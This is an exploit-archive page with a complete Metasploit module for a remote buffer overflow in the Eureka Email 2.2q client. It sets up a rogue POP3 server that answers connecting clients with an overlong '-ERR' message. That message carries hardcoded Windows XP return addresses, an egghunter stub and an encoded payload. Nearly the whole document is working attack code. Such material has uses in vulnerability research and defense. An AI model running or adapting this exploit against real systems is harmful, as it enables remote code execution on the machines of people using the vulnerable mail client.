Eureka Email 2.2q ERR Remote Buffer Overflow Exploit (meta)
===========================================================


# Title: Eureka Email 2.2q ERR Remote Buffer Overflow Exploit (meta)
# CVE-ID: ()
# OSVDB-ID: ()
# Author: Francis Provencher Dr_IDE dookie
# Published: 2009-12-09
# Verified: yes

view source
print?
class Metasploit3 < Msf::Exploit::Remote
        Rank = NormalRanking
 
        include Msf::Exploit::Remote::TcpServer
        include Msf::Exploit::Egghunter
 
        def initialize(info = {})
                super(update_info(info,
                        &#039;Name&#039;           => &#039;Eureka Email 2.2q ERR Remote Buffer Overflow Exploit&#039;,
                        &#039;Description&#039;    => %q{
                                This module exploits a buffer overflow in the Eureka Email 2.2q
                                client that is triggered through an excessively long ERR message.
                        },
                        &#039;Author&#039;         => [ &#039;Dr_IDE&#039;, ],
                        &#039;License&#039;        => MSF_LICENSE,
                        &#039;Version&#039;        => &#039;$Revision: 7724 $&#039;,
                        &#039;References&#039;     =>
                                [
                                        [ &#039;URL&#039;, &#039;http://inj3ct0r.com&#039; ],
                                ],
                        &#039;DefaultOptions&#039; =>
                                {
                                        &#039;EXITFUNC&#039; => &#039;seh&#039;,
                                },
                        &#039;Payload&#039;        =>
                                {
                                        &#039;Space&#039;    => 2000,
                                        &#039;BadChars&#039; => "\x00\x0a\x0d\x20",
                                        &#039;StackAdjustment&#039; => -3500,
                                },
                        &#039;Platform&#039;       => &#039;win&#039;,
                        &#039;Targets&#039;        =>
                                [
                                        [ &#039;Win XP SP2 English&#039;, { &#039;Ret&#039; => 0x77D8AF0A } ], # jmp esp user32.dll
                                        [ &#039;Win XP SP3 English&#039;, { &#039;Ret&#039; => 0x7E429353 } ], # jmp esp user32.dll
                                ],
                        &#039;Privileged&#039;     => false,
                        &#039;DefaultTarget&#039;  => 0))
 
                register_options(
                        [
                                OptPort.new(&#039;SRVPORT&#039;, [ true, "The POP3 daemon port to listen on", 110 ]),
                        ], self.class)
        end
 
        def on_client_connect(client)
                return if ((p = regenerate_payload(client)) == nil)
 
                # Unleash the Egghunter!
                eh_stub, eh_egg = generate_egghunter
 
                buffer =  "-ERR "
                buffer << rand_text_alpha_upper(710)
                buffer << [target.ret].pack(&#039;V&#039;)
                buffer << make_nops(10)
                buffer << eh_stub
                buffer << make_nops(200)
                buffer << rand_text_alpha_upper(2000)
                buffer << eh_egg * 2
                buffer << payload.encoded
                client.put(buffer)
        end
 
end



